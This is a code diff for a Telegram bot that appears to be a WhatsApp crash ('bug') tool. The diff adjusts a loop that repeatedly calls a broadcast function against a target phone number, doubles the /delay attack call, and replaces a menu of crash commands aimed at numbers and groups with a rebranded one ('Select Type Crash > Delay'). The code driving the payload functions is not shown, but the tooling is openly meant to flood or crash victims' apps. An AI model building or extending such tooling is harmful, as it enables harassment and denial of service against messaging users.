@@ -1120,7 +1120,7 @@ async function VampOri(target) {
 
 }
 async function VampDelayInvis(target) {
-    for (let i = 0; i <= 800; i++) {
+    for (let i = 0; i <= 50; i++) {
     await VampBroadcast(target, mention = true)
     await VampBroadcast(target, mention = true)
     await VampBroadcast(target, mention = true)
@@ -1626,6 +1626,7 @@ bot.onText(/\/delay(?:\s(.+))?/, async (msg, match) => {
 
     for (let i = 0; i < 1; i++) { // Kirim 3 kali langsung
         await VampDelayInvis(formatedNumber);
+        await VampDelayInvis(formatedNumber);
     }
 
     // Kirim notifikasi setelah selesai dengan gambar lain
@@ -1985,35 +1986,28 @@ bot.on("callback_query", async (callbackQuery) => {
                 }
             });
         } else if (action === "bugmenu") {
-            let ligma = `𖤊───⪩  𝐕𝐀𝐌𝐏𝐈𝐑𝐄 𝟖.𝟎 𝐏𝐑𝐎  ⪨───𖤊
-╭──────────────────────╮
-│➼ Nᴀᴍᴇ : ${senderName}
-│➼ Dᴇᴠᴇʟᴏᴘᴇʀ : @Vampiresagara
-│➼ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
-│➼ Oɴʟɪɴᴇ : ${getOnlineDuration()}
-╰──────────────────────╯
-╭────── 「   𝐁𝐮𝐠 𝐌𝐞𝐧𝐮   」 ──────╮
-│➥ /vampori 62×××
-│➥ /vampbeta 62×××
-│➥ /vampbussines 62×××
-│➥ /vampios 62×××
-│➥ /vampdelay 62×××
-│➥ /vampui 62×××
-╰──────────────────────╯
-╭───「  𝐁𝐮𝐠 𝐆𝐫𝐨𝐮𝐩 & 𝐂𝐡𝐚𝐧𝐧𝐞𝐥  」───╮
-│➢ /vampgroup <Link>
-│➢ /vampch <Newsletter>
-╰──────────────────────╯
-`;
-            bot.sendPhoto(chatId, "https://files.catbox.moe/ecepcb.jpg", {
-                caption: ligma,
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            {
-                                text: "〢𝐂𝐨𝐧𝐭𝐚𝐜𝐭",
-                                url: "https://t.me/Vampiresagara"
-                            }
+            let ligma = `Hellow I am Bot Ranz Tele ᯤ Ready to carry out the task  友
+╭━━━━━━━━━━━━━━━━━━
+│ Select Type Crash > Delay
+╭━━━━━━━━━━━━━━━━━━
+│ Owners : @abee1945
+╭━━━━━━━━━━━━━━━━━
+│ 語  /delay
+│ 語  /bakios
+│ 語  /system
+│
+╰━━━━━━━━━━━━━━━━━━
+
+- © 𝐑𝐚𝐧𝐳𝐢𝐬𝐆𝐎𝐎𝐃 ᯤ`;
+  bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
+      caption: ligma,
+      reply_markup: {
+          inline_keyboard: [
+              [
+                  {
+                      text: "〢𝐂𝐨𝐧𝐭𝐚𝐜𝐭",
+                      url: "https://t.me/abee1945"
+                  }
                         ]
                     ]
                 }
